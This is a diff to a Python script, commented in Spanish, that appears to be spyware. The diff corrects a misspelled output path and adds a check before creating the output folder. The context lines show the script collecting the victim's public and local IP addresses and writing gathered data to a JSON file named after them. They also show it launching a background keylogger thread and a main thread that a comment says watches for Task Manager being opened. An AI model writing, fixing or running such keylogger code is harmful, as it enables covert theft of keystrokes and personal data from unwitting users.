@@ -47,10 +47,10 @@ def main():
 
     publicIP= net.getPublicIP() #Obtemos la ip local y pública
     localIP = net.getLocalIP()
-
-    os.mkdir(f'{carpeta_script}\\output')
+    if not os.path.exists(f'{carpeta_script}\\output'):
+        os.mkdir(f'{carpeta_script}\\output')
     #Creamos un archivo json usando nuestra ip local y pública como nombre. Usaremos este archivo para anotar toda la información
-    with open(f'{carpeta_script}\\ouput\\{publicIP.replace(".", "-")}_{localIP.replace(".", "-")}.json', 'w') as archivo:
+    with open(f'{carpeta_script}\\output\\{publicIP.replace(".", "-")}_{localIP.replace(".", "-")}.json', 'w') as archivo:
         
         # ------------------------------------
         # ----------   NETWORK  --------------
@@ -191,7 +191,7 @@ if __name__ == "__main__":
     mainThread.start()
 
     if USE_KEYLOGGER:
-        fileName= f"{carpeta_script}\\ouput\\{net.getPublicIP()}".replace(".", "-")+"_"+f"{net.getLocalIP()}".replace(".", "-") #Creamos un nombre para el archivo de keylogger con la ip pública y la ip local
+        fileName= f"{carpeta_script}\\output\\{net.getPublicIP()}".replace(".", "-")+"_"+f"{net.getLocalIP()}".replace(".", "-") #Creamos un nombre para el archivo de keylogger con la ip pública y la ip local
         keyLogger = threading.Thread(target=sens.listen, args=(fileName,)) #Preparamos el proceso con la función listen para que se ejecute en paralelo
         keyLogger.daemon = True     # Hacemos que el hilo keylogger termine si el hilo principal (el que estará en un bucle vigilando que el task manager no se abre) muere
         keyLogger.start()           #Iniciamos el key logger
